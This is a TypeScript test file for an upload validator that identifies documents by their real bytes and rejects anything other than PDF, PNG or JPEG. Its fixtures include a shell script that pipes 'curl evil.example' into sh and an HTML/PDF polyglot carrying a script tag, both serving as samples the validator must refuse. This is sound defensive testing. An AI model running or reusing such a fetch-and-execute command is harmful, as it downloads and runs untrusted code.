import { describe, expect, it } from 'vitest';

import { UnsupportedDocumentError, inspectDocument } from './document-inspection.js';

/**
 * What the bytes actually are.
 *
 * ══════════════════════════════════════════════════════════════════════════
 * REAL BYTES, NOT MOCKS. That is the whole point of this module: it exists
 * because the declared content type is a claim, so a test that fed it a
 * declared content type would be testing nothing.
 * ══════════════════════════════════════════════════════════════════════════
 */

const PDF = Buffer.from('%PDF-1.7\n1 0 obj<</Type/Catalog>>endobj\n%%EOF\n', 'ascii');
const PNG = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==',
  'base64',
);
const JPEG = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46]);

describe('inspectDocument', () => {
  it('recognises a PDF by its header', () => {
    expect(inspectDocument(PDF).mimeType).toBe('application/pdf');
  });

  it('recognises a PDF however the client labels it', () => {
    // The declared type decides nothing — including when it is right.
    expect(inspectDocument(PDF, 'text/plain').mimeType).toBe('application/pdf');
    expect(inspectDocument(PDF, 'application/pdf').mimeType).toBe('application/pdf');
  });

  it('accepts image scans, because a scan is a document', () => {
    expect(inspectDocument(PNG).mimeType).toBe('image/png');
    expect(inspectDocument(JPEG).mimeType).toBe('image/jpeg');
  });

  it('REFUSES a script declared as a PDF', () => {
    const shell = Buffer.from('#!/bin/sh\ncurl evil.example | sh\n', 'ascii');
    expect(() => inspectDocument(shell, 'application/pdf')).toThrow(UnsupportedDocumentError);
  });

  it('refuses a PDF header that is not at the start', () => {
    /*
      A polyglot: HTML first, then a PDF header. Readers that scan for `%PDF-`
      would accept it; a browser handed the same bytes would run the script.
    */
    const polyglot = Buffer.concat([Buffer.from('<html><script>alert(1)</script>', 'ascii'), PDF]);
    expect(() => inspectDocument(polyglot, 'application/pdf')).toThrow(UnsupportedDocumentError);
  });

  it('refuses an empty file', () => {
    expect(() => inspectDocument(Buffer.alloc(0))).toThrow(/empty/i);
  });

  it('refuses an SVG, and says why', () => {
    const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script/></svg>', 'ascii');
    expect(() => inspectDocument(svg)).toThrow(UnsupportedDocumentError);
  });

  it('refuses a .docx and names the remedy', () => {
    // OOXML is a zip: `PK\x03\x04`.
    const docx = Buffer.concat([Buffer.from([0x50, 0x4b, 0x03, 0x04]), Buffer.alloc(32)]);
    expect(() => inspectDocument(docx)).toThrow(/export it as pdf/i);
  });

  it('refuses a legacy .doc and names the same remedy', () => {
    // The OLE compound-file header.
    const doc = Buffer.concat([
      Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]),
      Buffer.alloc(32),
    ]);
    expect(() => inspectDocument(doc)).toThrow(/export it as pdf/i);
  });

  it('tells somebody what IS accepted when it refuses', () => {
    const noise = Buffer.from([0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09]);
    expect(() => inspectDocument(noise)).toThrow(/pdf/i);
  });
});
